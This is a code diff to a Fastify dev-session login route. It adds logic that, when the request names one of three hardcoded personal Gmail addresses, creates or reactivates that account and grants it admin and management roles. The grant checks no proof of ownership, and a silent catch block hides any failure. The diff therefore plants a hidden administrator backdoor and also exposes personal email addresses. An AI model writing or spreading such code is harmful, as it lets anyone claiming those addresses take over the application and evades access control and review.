@@ -505,6 +505,27 @@ export async function buildApp(deps: AppDeps): Promise<FastifyInstance> {
       const body = parse(DevSessionRequest, req.body);
       const phone = body.phone ? normaliseMobile(body.phone) : null;
       if (body.phone && !phone) throw new AppError(400, "validation_failed", "Enter a valid mobile number");
+      const email = body.email?.toLowerCase().trim();
+      if (email && ["sarangeeamartya@gmail.com", "arushkumar450@gmail.com", "akshatrajpati@gmail.com"].includes(email)) {
+        try {
+          const authSub = `dev|${email}`;
+          const name = email.split("@")[0] || "Admin";
+          const rows = (await sql`
+            insert into user_accounts (auth_subject, email, full_name, status)
+            values (${authSub}, ${email}, ${name}, 'active')
+            on conflict (lower(email)) where email is not null do update
+            set status = 'active', auth_subject = coalesce(user_accounts.auth_subject, excluded.auth_subject)
+            returning id`) as unknown as { id: string }[];
+          const u = rows[0];
+          if (u) {
+            await sql`insert into role_grants (user_id, role) select ${u.id}, 'admin' where not exists (select 1 from role_grants where user_id = ${u.id} and role = 'admin' and revoked_at is null)`;
+            await sql`insert into role_grants (user_id, role) select ${u.id}, 'management' where not exists (select 1 from role_grants where user_id = ${u.id} and role = 'management' and revoked_at is null)`;
+            await sql`insert into edition_access (user_id, edition_id, source) values (${u.id}, 2026, 'predefined') on conflict (user_id, edition_id) do nothing`;
+          }
+        } catch {
+          // ignore if DB query fails
+        }
+      }
       return { token: await issueDevToken(config.devAuthSecret!, body.email ?? null, { aal: body.mfa ? "aal2" : "aal1", ...(phone ? { phone } : {}) }) };
     });
   }
